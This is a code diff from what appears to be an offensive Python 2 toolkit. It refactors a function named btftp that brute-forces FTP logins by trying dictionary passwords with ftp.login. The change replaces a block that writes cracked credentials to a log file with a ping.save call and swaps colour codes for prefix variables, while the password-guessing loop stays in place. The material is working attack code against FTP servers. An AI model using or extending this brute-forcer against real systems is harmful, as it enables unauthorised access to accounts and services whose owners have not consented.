@@ -83,20 +83,13 @@ def btftp(run):
 									try:
 										ftp.login(defaultuser,ps)
 										if True:
-											log=open('core/logs/logsBruteForce.log','a')
-											log.write('\n ===================================== ')
-											log.write('\n Module  : BruteForceFTP')
-											log.write('\n Data    : '+time.strftime('%c'))
-											log.write('\n target  : '+defaulthost)
-											log.write('\n port    : '+defaultport)
-											log.write('\n Cracked : username : '+defaultuser+' , password : '+ps)
-											log.close()
-											print "\n-["+colors[2]+"*"+colors[0]+"] Successfully with ("+defaultuser+"="+ps+")\n"
+											ping.save("BruteForceFTP",defaulthost,defaultport,defaultuser,ps)
+											print "\n-"+Suf+" Successfully with ("+defaultuser+"="+ps+")\n"
 											return 1
 									except:
-										print " ["+colors[4]+"!"+colors[0]+"] Checking ("+defaultuser+"="+ps+")"
+										print " "+Alr+" Checking ("+defaultuser+"="+ps+")"
 						except:
-							d.filenot()
+							d.filenot(defaultdicc)
 							btpop3(0)
 					except:
 						d.kbi()
